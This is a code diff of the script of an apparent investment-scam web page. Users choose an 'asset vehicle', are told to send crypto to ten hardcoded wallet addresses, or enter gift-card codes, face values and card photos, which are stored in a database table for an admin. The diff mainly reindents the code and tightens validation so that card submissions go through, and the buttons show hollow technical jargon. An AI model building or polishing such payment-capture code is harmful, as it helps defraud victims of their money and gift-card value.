@@ -339,290 +339,307 @@
     </main>
 
     <script>
-        // ========== SUPABASE CONNECTION ==========
-        const SUPABASE_URL = "https://jawpzkqvcvcrmpirqcma.supabase.co";
-        const SUPABASE_ANON_KEY = "sb_publishable_EAds5LMLdll_0ubbbhw_kg_fJxzlOtH";
-        const { createClient } = supabase;
-        const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        // =========================================
+    // ========== SUPABASE CONNECTION ==========
+    const SUPABASE_URL = "https://jawpzkqvcvcrmpirqcma.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_EAds5LMLdll_0ubbbhw_kg_fJxzlOtH";
+    const { createClient } = supabase;
+    const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    // =========================================
 
-        const userId = localStorage.getItem("userId");
-        if (!userId) {
-            window.location.href = "index.html";
+    const userId = localStorage.getItem("userId");
+    if (!userId) {
+        window.location.href = "index.html";
+    }
+
+    const wallets = {
+        "Dash (DASH)": { address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", scheme: "dash:XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", label: "Dash (DASH)", moonpayCode: "dash" },
+        "Litecoin (LTC)": { address: "ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", scheme: "litecoin:ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", label: "Litecoin (LTC)", moonpayCode: "ltc" },
+        "XRP (XRP)": { address: "rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", scheme: "xrpl:rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", label: "XRP (XRP)", moonpayCode: "xrp" },
+        "Tron (TRX)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tron (TRX)", moonpayCode: "trx" },
+        "USDC (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USD Coin (ERC20)", moonpayCode: "usdc" },
+        "USDT (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USDT (ERC20)", moonpayCode: "usdt" },
+        "Ethereum (ETH)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "Ethereum (ETH)", moonpayCode: "eth" },
+        "Solana (SOL)": { address: "3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", scheme: "solana:3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", label: "Solana (SOL)", moonpayCode: "sol" },
+        "Bitcoin (BTC)": { address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", scheme: "bitcoin:bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", label: "Bitcoin (BTC)", moonpayCode: "btc" },
+        "USDT (TRC20)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tether USDT (TRC20)", moonpayCode: "usdt_tron" }
+    };
+
+    let currentPaymentMethod = 'crypto';
+    let selectedCardImages = [];
+
+    function setPaymentMethod(method) {
+        currentPaymentMethod = method;
+        const cryptoBtn = document.getElementById('payCryptoBtn');
+        const cardBtn = document.getElementById('payCardBtn');
+        const cryptoSection = document.getElementById('cryptoSection');
+        const cardSection = document.getElementById('cardSection');
+        const investAmount = document.getElementById('investAmount');
+
+        if (method === 'crypto') {
+            cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white';
+            cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white';
+            cryptoSection.classList.remove('hidden');
+            cardSection.classList.add('hidden');
+            // Make crypto amount required, card fields not required
+            investAmount.required = true;
+        } else {
+            cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white';
+            cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white';
+            cryptoSection.classList.add('hidden');
+            cardSection.classList.remove('hidden');
+            // Remove required from hidden crypto field so form can submit
+            investAmount.required = false;
+            investAmount.value = '';
         }
+    }
 
-        // Wallets (kept exactly as original)
-        const wallets = {
-            "Dash (DASH)": { address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", scheme: "dash:XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", label: "Dash (DASH)", moonpayCode: "dash" },
-            "Litecoin (LTC)": { address: "ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", scheme: "litecoin:ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", label: "Litecoin (LTC)", moonpayCode: "ltc" },
-            "XRP (XRP)": { address: "rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", scheme: "xrpl:rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", label: "XRP (XRP)", moonpayCode: "xrp" },
-            "Tron (TRX)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tron (TRX)", moonpayCode: "trx" },
-            "USDC (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USD Coin (ERC20)", moonpayCode: "usdc" },
-            "USDT (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USDT (ERC20)", moonpayCode: "usdt" },
-            "Ethereum (ETH)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "Ethereum (ETH)", moonpayCode: "eth" },
-            "Solana (SOL)": { address: "3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", scheme: "solana:3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", label: "Solana (SOL)", moonpayCode: "sol" },
-            "Bitcoin (BTC)": { address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", scheme: "bitcoin:bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", label: "Bitcoin (BTC)", moonpayCode: "btc" },
-            "USDT (TRC20)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tether USDT (TRC20)", moonpayCode: "usdt_tron" }
-        };
+    // Card image handling
+    document.getElementById('cardImagesInput').addEventListener('change', function(e) {
+        const files = Array.from(e.target.files);
+        const remaining = 10 - selectedCardImages.length;
+        const toAdd = files.slice(0, remaining);
 
-        let currentPaymentMethod = 'crypto';
-        let selectedCardImages = [];
-
-        function setPaymentMethod(method) {
-            currentPaymentMethod = method;
-            const cryptoBtn = document.getElementById('payCryptoBtn');
-            const cardBtn = document.getElementById('payCardBtn');
-            const cryptoSection = document.getElementById('cryptoSection');
-            const cardSection = document.getElementById('cardSection');
-
-            if (method === 'crypto') {
-                cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white';
-                cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white';
-                cryptoSection.classList.remove('hidden');
-                cardSection.classList.add('hidden');
-            } else {
-                cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white';
-                cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white';
-                cryptoSection.classList.add('hidden');
-                cardSection.classList.remove('hidden');
-            }
-        }
-
-        // Card image handling
-        document.getElementById('cardImagesInput').addEventListener('change', function(e) {
-            const files = Array.from(e.target.files);
-            const remaining = 10 - selectedCardImages.length;
-            const toAdd = files.slice(0, remaining);
-
-            toAdd.forEach(file => {
-                if (!file.type.startsWith('image/')) return;
-                const reader = new FileReader();
-                reader.onload = function(ev) {
-                    selectedCardImages.push({ file, dataUrl: ev.target.result });
-                    renderImagePreviews();
-                };
-                reader.readAsDataURL(file);
-            });
-            this.value = '';
+        toAdd.forEach(file => {
+            if (!file.type.startsWith('image/')) return;
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                selectedCardImages.push({ file, dataUrl: ev.target.result });
+                renderImagePreviews();
+            };
+            reader.readAsDataURL(file);
         });
+        this.value = '';
+    });
 
-        function renderImagePreviews() {
-            const container = document.getElementById('imgPreviewContainer');
-            container.innerHTML = '';
-            selectedCardImages.forEach((item, idx) => {
-                const div = document.createElement('div');
-                div.className = 'img-preview-item w-20 h-20';
-                div.innerHTML = `
-                    <img src="${item.dataUrl}" class="w-20 h-20 rounded-xl object-cover border border-[#333]">
-                    <button type="button" class="img-remove-btn" onclick="removeCardImage(${idx})">×</button>
-                `;
-                container.appendChild(div);
-            });
-            const counter = document.getElementById('imgCounter');
-            counter.textContent = `${selectedCardImages.length} / 10`;
-            counter.className = selectedCardImages.length > 0 ? 'text-emerald-400 font-normal normal-case' : 'text-blue-400 font-normal normal-case';
-        }
-
-        function removeCardImage(idx) {
-            selectedCardImages.splice(idx, 1);
-            renderImagePreviews();
-        }
-
-        function selectAssetVehicle(vehicleName) {
-            document.getElementById('assetCardsGrid').classList.add('hidden');
-            document.getElementById('mainContainer').classList.remove('max-w-5xl');
-            document.getElementById('mainContainer').classList.add('max-w-md');
-            document.getElementById('selectedVehicleBadge').innerText = vehicleName;
-            document.getElementById('formCard').classList.remove('hidden');
-            setPaymentMethod('crypto');
-        }
-
-        function resetToAssetGrid() {
-            document.getElementById('formCard').classList.add('hidden');
-            document.getElementById('cardSuccessCard').classList.add('hidden');
-            document.getElementById('paymentCard').classList.add('hidden');
-            document.getElementById('mainContainer').classList.remove('max-w-md');
-            document.getElementById('mainContainer').classList.add('max-w-5xl');
-            document.getElementById('assetCardsGrid').classList.remove('hidden');
-            selectedCardImages = [];
-            renderImagePreviews();
-            document.getElementById('cardName').value = '';
-            document.getElementById('cardCode').value = '';
-            document.getElementById('cardFaceValue').value = '';
-        }
-
-        // Custom select
-        const selectTrigger = document.getElementById('customSelectTrigger');
-        const selectMenu = document.getElementById('customSelectMenu');
-        const dropdownArrow = document.getElementById('dropdownArrow');
-        const hiddenInput = document.getElementById('assetSelect');
-        const selectedAssetContainer = document.getElementById('selectedAssetContainer');
-
-        selectTrigger.addEventListener('click', (e) => {
-            e.stopPropagation();
-            selectMenu.classList.toggle('hidden');
-            dropdownArrow.classList.toggle('rotate-180');
+    function renderImagePreviews() {
+        const container = document.getElementById('imgPreviewContainer');
+        container.innerHTML = '';
+        selectedCardImages.forEach((item, idx) => {
+            const div = document.createElement('div');
+            div.className = 'img-preview-item w-20 h-20';
+            div.innerHTML = `
+                <img src="${item.dataUrl}" class="w-20 h-20 rounded-xl object-cover border border-[#333]">
+                <button type="button" class="img-remove-btn" onclick="removeCardImage(${idx})">×</button>
+            `;
+            container.appendChild(div);
         });
+        const counter = document.getElementById('imgCounter');
+        counter.textContent = `${selectedCardImages.length} / 10`;
+        counter.className = selectedCardImages.length > 0 ? 'text-emerald-400 font-normal normal-case' : 'text-blue-400 font-normal normal-case';
+    }
 
-        document.addEventListener('click', () => {
+    function removeCardImage(idx) {
+        selectedCardImages.splice(idx, 1);
+        renderImagePreviews();
+    }
+
+    function selectAssetVehicle(vehicleName) {
+        document.getElementById('assetCardsGrid').classList.add('hidden');
+        document.getElementById('mainContainer').classList.remove('max-w-5xl');
+        document.getElementById('mainContainer').classList.add('max-w-md');
+        document.getElementById('selectedVehicleBadge').innerText = vehicleName;
+        document.getElementById('formCard').classList.remove('hidden');
+        setPaymentMethod('crypto');
+    }
+
+    function resetToAssetGrid() {
+        document.getElementById('formCard').classList.add('hidden');
+        document.getElementById('cardSuccessCard').classList.add('hidden');
+        document.getElementById('paymentCard').classList.add('hidden');
+        document.getElementById('mainContainer').classList.remove('max-w-md');
+        document.getElementById('mainContainer').classList.add('max-w-5xl');
+        document.getElementById('assetCardsGrid').classList.remove('hidden');
+        selectedCardImages = [];
+        renderImagePreviews();
+        document.getElementById('cardName').value = '';
+        document.getElementById('cardCode').value = '';
+        document.getElementById('cardFaceValue').value = '';
+        document.getElementById('investAmount').value = '';
+    }
+
+    // Custom select
+    const selectTrigger = document.getElementById('customSelectTrigger');
+    const selectMenu = document.getElementById('customSelectMenu');
+    const dropdownArrow = document.getElementById('dropdownArrow');
+    const hiddenInput = document.getElementById('assetSelect');
+    const selectedAssetContainer = document.getElementById('selectedAssetContainer');
+
+    selectTrigger.addEventListener('click', (e) => {
+        e.stopPropagation();
+        selectMenu.classList.toggle('hidden');
+        dropdownArrow.classList.toggle('rotate-180');
+    });
+
+    document.addEventListener('click', () => {
+        selectMenu.classList.add('hidden');
+        dropdownArrow.classList.remove('rotate-180');
+    });
+
+    document.querySelectorAll('.asset-option').forEach(option => {
+        option.addEventListener('click', function() {
+            const value = this.getAttribute('data-value');
+            const name = this.getAttribute('data-name');
+            const network = this.getAttribute('data-network');
+            const img = this.getAttribute('data-img');
+            const rate = this.getAttribute('data-rate');
+            const change = this.getAttribute('data-change');
+
+            hiddenInput.value = value;
+            const badgeHtml = network ? `<span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">${network}</span>` : '';
+            const changeColor = change.includes('-') ? 'text-red-500' : 'text-emerald-500';
+
+            selectedAssetContainer.innerHTML = `
+                <img src="${img}" class="w-6 h-6 rounded-full" alt="${name}">
+                <div>
+                    <div class="flex items-center space-x-1.5">
+                        <span class="text-sm font-bold text-white">${name}</span>
+                        ${badgeHtml}
+                    </div>
+                    <p class="text-[10px] text-neutral-400 mt-0.5">${rate} <span class="${changeColor}">${change}</span></p>
+                </div>
+            `;
             selectMenu.classList.add('hidden');
             dropdownArrow.classList.remove('rotate-180');
         });
+    });
 
-        document.querySelectorAll('.asset-option').forEach(option => {
-            option.addEventListener('click', function() {
-                const value = this.getAttribute('data-value');
-                const name = this.getAttribute('data-name');
-                const network = this.getAttribute('data-network');
-                const img = this.getAttribute('data-img');
-                const rate = this.getAttribute('data-rate');
-                const change = this.getAttribute('data-change');
-
-                hiddenInput.value = value;
-                const badgeHtml = network ? `<span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">${network}</span>` : '';
-                const changeColor = change.includes('-') ? 'text-red-500' : 'text-emerald-500';
-
-                selectedAssetContainer.innerHTML = `
-                    <img src="${img}" class="w-6 h-6 rounded-full" alt="${name}">
-                    <div>
-                        <div class="flex items-center space-x-1.5">
-                            <span class="text-sm font-bold text-white">${name}</span>
-                            ${badgeHtml}
-                        </div>
-                        <p class="text-[10px] text-neutral-400 mt-0.5">${rate} <span class="${changeColor}">${change}</span></p>
-                    </div>
-                `;
-                selectMenu.classList.add('hidden');
-                dropdownArrow.classList.remove('rotate-180');
-            });
-        });
-
-        async function copyWalletAddress() {
-            const addressText = document.getElementById('walletAddress').innerText;
-            const copyIcon = document.getElementById('copyIcon');
-            const copyTxt = document.getElementById('copyTxt');
-            try {
-                await navigator.clipboard.writeText(addressText);
-                copyIcon.classList.add('hidden');
-                copyTxt.classList.remove('hidden');
-                setTimeout(() => {
-                    copyTxt.classList.add('hidden');
-                    copyIcon.classList.remove('hidden');
-                }, 2000);
-            } catch (err) {
-                const el = document.createElement('textarea');
-                el.value = addressText;
-                document.body.appendChild(el);
-                el.select();
-                document.execCommand('copy');
-                document.body.removeChild(el);
-            }
+    async function copyWalletAddress() {
+        const addressText = document.getElementById('walletAddress').innerText;
+        const copyIcon = document.getElementById('copyIcon');
+        const copyTxt = document.getElementById('copyTxt');
+        try {
+            await navigator.clipboard.writeText(addressText);
+            copyIcon.classList.add('hidden');
+            copyTxt.classList.remove('hidden');
+            setTimeout(() => {
+                copyTxt.classList.add('hidden');
+                copyIcon.classList.remove('hidden');
+            }, 2000);
+        } catch (err) {
+            const el = document.createElement('textarea');
+            el.value = addressText;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
         }
+    }
 
-        // ========== MAIN SUBMIT (Supabase) ==========
-        document.getElementById('investForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const statusBox = document.getElementById('statusBox');
-            const submitBtn = document.getElementById('submitBtn');
-            
-            statusBox.classList.add('hidden');
-            submitBtn.disabled = true;
-            submitBtn.innerText = "Transmitting processing arrays...";
+    // ========== MAIN SUBMIT ==========
+    document.getElementById('investForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
 
-            const amount = parseFloat(document.getElementById('investAmount')?.value || document.getElementById('cardFaceValue')?.value || 0);
-            const currentVehicle = document.getElementById('selectedVehicleBadge').innerText;
+        const statusBox = document.getElementById('statusBox');
+        const submitBtn = document.getElementById('submitBtn');
 
-            try {
-                // ===== CARD SUBMISSION → goes to card_submissions (admin can see) =====
-                if (currentPaymentMethod === 'card') {
-                    const cardName = document.getElementById('cardName').value.trim();
-                    const cardCode = document.getElementById('cardCode').value.trim();
-                    const faceValue = parseFloat(document.getElementById('cardFaceValue').value);
+        statusBox.classList.add('hidden');
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Transmitting processing arrays...";
 
-                    if (!cardName) throw new Error("Please enter the Card Name.");
-                    if (selectedCardImages.length === 0) throw new Error("Please upload at least one card image.");
-                    if (!faceValue || faceValue <= 0) throw new Error("Please enter a valid Face Value.");
+        const currentVehicle = document.getElementById('selectedVehicleBadge').innerText;
 
-                    const cardId = "CARD-" + Math.floor(100000 + Math.random() * 900000);
+        try {
+            // ==================== CARD PAYMENT ====================
+            if (currentPaymentMethod === 'card') {
+                const cardName = document.getElementById('cardName').value.trim();
+                const cardCode = document.getElementById('cardCode').value.trim();
+                const faceValue = parseFloat(document.getElementById('cardFaceValue').value);
 
-                    // Store card submission for admin
-                    const { error: cardError } = await _supabase
-                        .from('card_submissions')
-                        .insert({
-                            id: cardId,
-                            user_id: userId,
-                            card_type: cardName,
-                            card_number: cardCode,
-                            expiry: null,
-                            cvv: null,
-                            status: 'Pending'
-                        });
+                if (!cardName) throw new Error("Please enter the Card Name / Brand.");
+                if (!cardCode) throw new Error("Please enter the Card Code / Number.");
+                if (!faceValue || faceValue <= 0) throw new Error("Please enter a valid Face Value.");
+                if (selectedCardImages.length === 0) throw new Error("Please upload at least one card image.");
 
-                    if (cardError) throw cardError;
+                const cardId = "CARD-" + Math.floor(100000 + Math.random() * 900000);
+                const invId  = "INV-"  + Math.floor(100000 + Math.random() * 900000);
 
-                    // Also create an investment record
-                    const invId = "INV-" + Math.floor(100000 + Math.random() * 900000);
-                    const { error: invError } = await _supabase
-                        .from('investments')
-                        .insert({
-                            id: invId,
-                            user_id: userId,
-                            amount: faceValue,
-                            asset: currentVehicle + " via Card",
-                            status: 'Pending Verification'
-                        });
+                // 1. Save to card_submissions (admin can see this)
+                const { error: cardError } = await _supabase
+                    .from('card_submissions')
+                    .insert({
+                        id: cardId,
+                        user_id: userId,
+                        card_type: cardName,
+                        card_number: cardCode,
+                        expiry: null,
+                        cvv: null,
+                        status: 'Pending'
+                    });
 
-                    if (invError) throw invError;
-
-                    // Show success
-                    document.getElementById('formCard').classList.add('hidden');
-                    document.getElementById('cardSuccessCard').classList.remove('hidden');
-                    return;
+                if (cardError) {
+                    console.error("Card insert error:", cardError);
+                    throw new Error("Failed to save card details: " + cardError.message);
                 }
 
-                // ===== CRYPTO SUBMISSION =====
-                const asset = document.getElementById('assetSelect').value;
-                const selectedWallet = wallets[asset];
-
-                if (!amount || amount < 50) throw new Error("Minimum investment is $50.");
-
-                const invId = "INV-" + Math.floor(100000 + Math.random() * 900000);
-
-                const { error } = await _supabase
+                // 2. Also create investment record
+                const { error: invError } = await _supabase
                     .from('investments')
                     .insert({
                         id: invId,
                         user_id: userId,
-                        amount: amount,
-                        asset: asset + " → " + currentVehicle,
+                        amount: faceValue,
+                        asset: currentVehicle + " via Card",
                         status: 'Pending Verification'
                     });
 
-                if (error) throw error;
+                if (invError) {
+                    console.error("Investment insert error:", invError);
+                    throw new Error("Failed to create investment record: " + invError.message);
+                }
 
-                // Show payment instructions
-                document.getElementById('walletAddress').innerText = selectedWallet.address;
-                document.getElementById('payAmountDisplay').innerText = `${amount} USD (${asset.split(' ')[0]})`;
-                document.getElementById('bannerAsset').innerText = selectedWallet.label;
-                document.getElementById('walletLabel').innerText = selectedWallet.label;
-                document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(selectedWallet.address)}`;
-                document.getElementById('trustWalletLink').href = `${selectedWallet.scheme}?amount=${amount}`;
-
-                const mCode = selectedWallet.moonpayCode || "usdt_tron";
-                document.getElementById('moonPayLink').href = `https://buy.moonpay.com?apiKey=pk_live_your_key_here&currencyCode=${mCode}&walletAddress=${encodeURIComponent(selectedWallet.address)}&baseCurrencyAmount=${amount}&baseCurrencyCode=usd`;
-
+                // Success → show success screen
                 document.getElementById('formCard').classList.add('hidden');
-                document.getElementById('paymentCard').classList.remove('hidden');
-
-            } catch (err) {
-                console.error(err);
-                statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400";
-                statusBox.innerText = err.message || "Failed to process. Please try again.";
-                statusBox.classList.remove('hidden');
-                submitBtn.disabled = false;
-                submitBtn.innerText = "Initialize Capital Integration";
+                document.getElementById('cardSuccessCard').classList.remove('hidden');
+                return;
             }
-        });
-    </script>
+
+            // ==================== CRYPTO PAYMENT ====================
+            const asset = document.getElementById('assetSelect').value;
+            const amount = parseFloat(document.getElementById('investAmount').value);
+            const selectedWallet = wallets[asset];
+
+            if (!amount || amount < 50) throw new Error("Minimum investment is $50.");
+
+            const invId = "INV-" + Math.floor(100000 + Math.random() * 900000);
+
+            const { error } = await _supabase
+                .from('investments')
+                .insert({
+                    id: invId,
+                    user_id: userId,
+                    amount: amount,
+                    asset: asset + " → " + currentVehicle,
+                    status: 'Pending Verification'
+                });
+
+            if (error) {
+                console.error("Crypto investment error:", error);
+                throw new Error("Failed to create investment: " + error.message);
+            }
+
+            // Show payment instructions
+            document.getElementById('walletAddress').innerText = selectedWallet.address;
+            document.getElementById('payAmountDisplay').innerText = `${amount} USD (${asset.split(' ')[0]})`;
+            document.getElementById('bannerAsset').innerText = selectedWallet.label;
+            document.getElementById('walletLabel').innerText = selectedWallet.label;
+            document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(selectedWallet.address)}`;
+            document.getElementById('trustWalletLink').href = `${selectedWallet.scheme}?amount=${amount}`;
+
+            const mCode = selectedWallet.moonpayCode || "usdt_tron";
+            document.getElementById('moonPayLink').href = `https://buy.moonpay.com?apiKey=pk_live_your_key_here&currencyCode=${mCode}&walletAddress=${encodeURIComponent(selectedWallet.address)}&baseCurrencyAmount=${amount}&baseCurrencyCode=usd`;
+
+            document.getElementById('formCard').classList.add('hidden');
+            document.getElementById('paymentCard').classList.remove('hidden');
+
+        } catch (err) {
+            console.error(err);
+            statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400";
+            statusBox.innerText = err.message || "Failed to process. Please try again.";
+            statusBox.classList.remove('hidden');
+            submitBtn.disabled = false;
+            submitBtn.innerText = "Initialize Capital Integration";
+        }
+    });
+</script>
 </body>
 </html>
